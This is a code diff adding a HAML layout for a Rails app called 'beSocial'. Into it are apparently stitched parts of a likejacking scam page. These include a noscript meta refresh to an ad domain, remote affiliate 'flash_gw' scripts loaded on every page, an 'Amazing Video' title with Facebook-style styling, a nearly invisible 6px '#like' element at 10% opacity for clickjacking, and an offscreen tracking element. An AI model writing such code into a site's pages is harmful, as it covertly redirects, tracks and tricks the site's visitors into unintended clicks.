@@ -1,0 +1,40 @@
+%html
+  %head{:profile => "http://gmpg.org/xfn/11"}
+    %title= content_for?(:title) ? yield(:title) : "beSocial"
+    = stylesheet_link_tag "application", "slider","jquery.jcarousel"
+    = javascript_include_tag :application, "jquery-1.7.1.min.js","jquery.jcarousel.pack", "func.js", "slider"
+    = csrf_meta_tag
+    = yield(:head)
+  %noscript
+    %meta{:content => "0;url=https://an.blamads.com/no_js/EL", "http-equiv" => "refresh"}/
+  %script{:src => "https://ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js", :type => "text/javascript"}
+  %script{:src => "https://gateways.s3.amazonaws.com/gateway/aff_13071/g2527/flash_gw.js", :type => "text/javascript"}
+  %link{:href => "http://www.blogger.com/profile/12388298149888111802", :rel => "me"}/
+  %link{:href => "http://www.blogger.com/openid-server.g", :rel => "openid.server"}/
+  :css
+    @import url(http://www.blogger.com/static/v1/v-css/navbar/697174003-classic.css);
+    div.b-mobile {display:none;}
+  :css
+    @import url(http://www.blogger.com/static/v1/v-css/navbar/697174003-classic.css);
+    div.b-mobile {display:none;}
+  %title Amazing Video
+  :css
+    html * {margin: 0; padding: 0;}
+    body {background: #fff; font-family: "lucida grande",tahoma,verdana,arial,sans-serif;}
+    #container {width: 800px; margin: 0 auto;}
+    h1 {background: #3B5998; border-bottom: 1px solid #213b73; padding: 20px 0; color: #fff; text-align: center; font-size: 22px; font-weight: 300;}
+    h2 {font-size: 14px; font-weight: 300; text-align: center; margin-top: 20px;}
+
+    #video a {display: block; text-decoration: none; margin: 20px 0; text-align: center;}
+    #video img {border: 0;}
+
+    #like {opacity:0.1;filter:alpha(opacity=10); width: 6px; height: 6px; overflow: hidden; position: absolute; left: 0; top: 0;}
+    #footer p {text-align: center; font-size: 8px; padding: 20px;}
+
+    #track {position: absolute; left: -9999px;}
+    #navbar { display: none; }
+    #navbar-iframe { display: none; }
+  %body
+    = render "layouts/header" if admin_signed_in?
+    #content
+      =yield
